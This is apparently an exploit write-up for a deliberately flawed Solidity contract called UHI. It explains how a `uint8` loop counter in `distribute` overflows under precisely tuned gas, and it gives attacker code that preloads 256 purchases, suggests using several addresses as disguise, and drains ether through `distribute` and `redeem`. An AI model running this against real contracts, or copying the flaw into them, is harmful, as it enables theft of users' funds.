# The Exploit

In `distribute`, `var i` is initialized as a `uint8`. Since the loop exits when
the gas left in the transaction hits 50000, it's possible to overflow the loop
counter and reset it to `0` by providing exactly the right amount of gas, thus
distributing all the ether held by the contract to the first 256 contributors.

To exploit this, use something like the following as part of the
deployment (perhaps using multiple addresses for disguise):

```
uhi = new UHI();

for (uint i = 0; i < 256; i++) {
    uhi.buy.value(1 ether)();
}
```

This will preload the contract with 256 purchase records belonging to
the attacker, allowing the overflow described to be exploited by
providing just the right amount of gas:

```
// extract tokens
uhi.distribute.gas(4900000)();
assertEq( uhi.num(), 0 );

// turn tokens into ether
uhi.redeem();

// successive calls to distribute need gas providing dependent on the
// number of real buyers
uhi.distribute.gas(3850000)();
uhi.redeem();
```
